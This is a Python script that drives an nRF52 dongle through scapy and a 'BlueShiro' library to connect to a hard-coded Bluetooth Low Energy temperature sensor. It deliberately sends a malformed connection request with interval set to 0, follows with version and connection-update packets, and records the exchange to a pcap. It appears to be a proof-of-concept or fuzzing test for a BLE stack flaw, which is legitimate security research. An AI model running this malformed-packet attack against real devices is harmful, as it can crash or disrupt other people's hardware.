import os
import sys
import binascii
from time import sleep

sys.path.insert(0, os.getcwd() + '/libs')
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *
from BlueShiro import BlueShiro
from colorama import Fore

phone_address = "fc:a9:f5:45:42:5a"
temperature_sensor_address = "a4:c1:38:7d:ab:b9"
running = 0
blueShiro = BlueShiro("70:a6:cc:b5:92:70", "/dev/ttyACM0", "a4:c1:38:7d:ab:b9")

scan_req = BTLE() / BTLE_ADV(RxAdd=blueShiro.slave_addr_type) / BTLE_SCAN_REQ(
    ScanA=blueShiro.master_addr,
    AdvA=blueShiro.slave_addr)
blueShiro.send(scan_req)
blueShiro.scan_timer.start()

print(Fore.GREEN + 'Waiting adv from ' + blueShiro.slave_addr)
while running<20:
    pkt = None
    data = blueShiro.driver.raw_receive()
    if data:
        pkt = BTLE(data)
        if pkt is None:
            blueShiro.none_count += 1
            if blueShiro.none_count >= 3:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        else:
            # print all CMD
            if BTLE_DATA in pkt:
                print(Fore.CYAN + "RX <--- " + pkt.summary()[7:])
            ### BTLE/ADV/ ###
            if (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == blueShiro.slave_addr.lower() and blueShiro.connecting == False:
                if blueShiro.connected:
                    print(Fore.RED + blueShiro.slave_addr.upper() + ' Disconnect')
                    exit(0)
                blueShiro.connecting = True
                blueShiro.scan_timer.cancel()
                blueShiro.slave_addr_type = pkt.RxAdd
                print(Fore.GREEN + blueShiro.slave_addr.upper() + ' Detected')
                conn_req = BTLE() / BTLE_ADV(RxAdd=blueShiro.slave_addr_type, TxAdd=blueShiro.master_addr_type) / BTLE_CONNECT_REQ(
                    InitA=blueShiro.master_addr,
                    AdvA=blueShiro.slave_addr,
                    AA=blueShiro.access_addr,  
                    crc_init=0x179a9c,  
                    win_size=2,  
                    win_offset=2, 
                    interval=24,  
                    latency=0,  
                    timeout=500, 
                    chM=0x1FFFFFFFFF,
                    hop=5,  
                    SCA=0
                )
                conn_req[BTLE_CONNECT_REQ].interval = 0
                blueShiro.send(conn_req)
                print(Fore.YELLOW + "Send conn_req with interval = 0")
                blueShiro.version_updating = True
                blueShiro.driver.save_pcap(filename="nRF52Dongle_" + os.path.basename(__file__).split('.')[0] + ".pcap")
            elif BTLE_DATA in pkt and blueShiro.version_updating:
                version_ind = BTLE(access_addr=blueShiro.access_addr) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
                blueShiro.send(version_ind)
                blueShiro.version_updating = False
                blueShiro.version_updated = True

            ### BTLE/DATA/CTRL/ ###
            elif LL_VERSION_IND in pkt and blueShiro.version_updated:
                conn_update_req = BTLE(access_addr=blueShiro.access_addr) / BTLE_DATA(LLID=3) / CtrlPDU() / LL_CONNECTION_UPDATE_REQ(
                    win_size=1,
                    win_offset=0,
                    interval=6,
                    latency=0,
                    timeout=500,
                    instant=15
                )
                blueShiro.send(conn_update_req)
                
            elif LL_LENGTH_REQ in pkt:
                pass
            elif LL_LENGTH_RSP in pkt:
                pass

            ### BTLE/DATA/L2CAP/ ###
            elif L2CAP_Connection_Parameter_Update_Request in pkt:
                pass
            elif L2CAP_Connection_Parameter_Update_Response in pkt:
                pass

            ### BTLE/DATA/L2CAP/SM/ ###
            elif SM_Pairing_Request in pkt:
                pass
            elif SM_Pairing_Response in pkt:
                pass
            elif SM_Public_Key in pkt:
                pass
            elif SM_Failed in pkt:
                pass

            ### BTLE/DATA/L2CAP/ATT/ ###
            elif ATT_Read_Request in pkt:
                pass
            elif ATT_Read_Response in pkt:
                pass
            elif ATT_Write_Command in pkt:
                pass
            elif ATT_Write_Request in pkt:
                pass
            elif ATT_Write_Response in pkt:
                pass    
            
            # keep connection alive
            elif BTLE_EMPTY_PDU in pkt and blueShiro.connected:
                empty_pdu = BTLE(access_addr=blueShiro.access_addr) / BTLE_DATA(LLID=1, len=0) / BTLE_EMPTY_PDU()
                blueShiro.send(empty_pdu)
                running += 1

    sleep(0.01)

terminate_req = BTLE(access_addr=blueShiro.access_addr) / BTLE_DATA(LLID=3) / CtrlPDU() / LL_TERMINATE_IND(code=0x13)
blueShiro.send(terminate_req)
blueShiro.driver.save_pcap(filename="nRF52Dongle_" + os.path.basename(__file__).split('.')[0] + ".pcap")
sleep(1)
print(Fore.YELLOW + "Connection Closed. Script Ends")